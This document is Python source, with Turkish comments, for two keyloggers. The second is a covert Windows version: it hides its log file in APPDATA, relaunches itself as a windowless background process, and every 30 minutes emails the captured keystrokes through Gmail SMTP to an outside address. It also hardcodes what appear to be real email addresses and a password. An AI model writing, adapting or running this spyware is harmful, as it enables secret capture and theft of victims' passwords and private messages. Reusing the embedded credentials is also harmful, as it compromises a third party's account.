import keyboard
from datetime import datetime

def on_key_press(event):
    # Tuş basımını dosyaya yaz
    with open("keylog.txt", "a") as log_file:
        log_file.write(f"{datetime.now()} - Key: {event.name}\n")

def main():
    print("Keylogger başlatıldı. Çıkmak için 'esc' tuşuna basın.")
    keyboard.on_press(on_key_press)  # Tuş basımını dinle
    keyboard.wait('esc')  # 'esc' tuşuna basılana kadar bekle

if __name__ == "__main__":
    main()
import keyboard
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import schedule
import time
import os
import sys
import win32api
import win32con
import win32process
import win32event

LOG_FILE = os.path.join(os.environ["APPDATA"], "keystrokes.log")

EMAIL_ADDRESS = "uslumehdi76@gmail.com"
EMAIL_PASSWORD = "Batesuslu76"
RECIPIENT_EMAIL = "mehdi4676@hotmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

def on_key_press(event):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - Key: {event.name}\n")

def send_email():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            log_content = f.read()
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECIPIENT_EMAIL
        msg["Subject"] = "Keylogger Logları"
        body = f"Keylogger logları:\n\n{log_content}"
        msg.attach(MIMEText(body, "plain"))
        try:
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, msg.as_string())
            server.quit()
            print("Loglar başarıyla e-posta ile gönderildi.")
        except Exception as e:
            print(f"E-posta gönderilirken hata oluştu: {e}")
    else:
        print("Log dosyası bulunamadı.")

def clear_log():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write("")
        print("Log dosyası temizlendi.")

def daemonize():
    try:
        startupinfo = win32process.STARTUPINFO()
        win32process.CreateProcess(
            None,
            f'"{sys.executable}" "{os.path.abspath(__file__)}" --daemon',
            None,
            None,
            0,
            win32process.CREATE_NO_WINDOW,
            None,
            None,
            startupinfo
        )
        sys.exit(0)
    except Exception as e:
        print(f"Arka plan işlemi oluşturulamadı: {e}")
        sys.exit(1)

def main():
    if os.path.exists(LOG_FILE):
        win32api.SetFileAttributes(LOG_FILE, win32con.FILE_ATTRIBUTE_HIDDEN)
    print("Keylogger başlatıldı. Program arka planda çalışıyor.")
    keyboard.on_press(on_key_press)
    schedule.every(30).minutes.do(send_email)
    schedule.every(35).minutes.do(clear_log)
    while True:
        schedule.run_pending()
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--daemon":
        main()
    else:
        daemonize()
